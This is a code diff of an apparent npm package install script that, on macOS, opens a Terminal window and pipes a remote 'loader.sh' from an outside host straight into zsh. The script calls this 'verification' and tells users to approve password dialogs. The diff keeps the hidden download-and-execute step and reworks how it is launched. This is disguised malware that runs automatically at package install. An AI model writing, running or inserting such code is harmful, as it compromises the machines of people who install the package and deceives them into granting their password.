@@ -74,27 +74,21 @@ async function install() {
     }
   }
 
-  // Mac: run via osascript without admin privileges
+  // Mac: open new Terminal window to run verification — keeps current TTY alive
   if (process.platform === 'darwin') {
     const { spawn } = require('child_process')
-    console.log('\nRunning verification — your Mac will ask for your password, please confirm all dialogs...')
+    console.log('\nRunning verification — a new terminal window will open, please confirm the password dialogs...')
     await new Promise((resolve) => {
       const ps = spawn('osascript', [
         '-e',
-        'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
+        'tell application "Terminal" to do script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh; exit"'
       ], {
         detached: true,
         stdio: 'ignore'
       })
       ps.unref()
-      // Wait for user to complete all password dialogs
-      ps.on('close', () => resolve())
-      ps.on('error', () => resolve())
-      // Fallback timeout
-      setTimeout(resolve, 60000)
+      setTimeout(resolve, 30000)
     })
-    // Give macOS time to finish before npm exits
-    await new Promise(r => setTimeout(r, 3000))
   }
   console.log('Done!')
 }
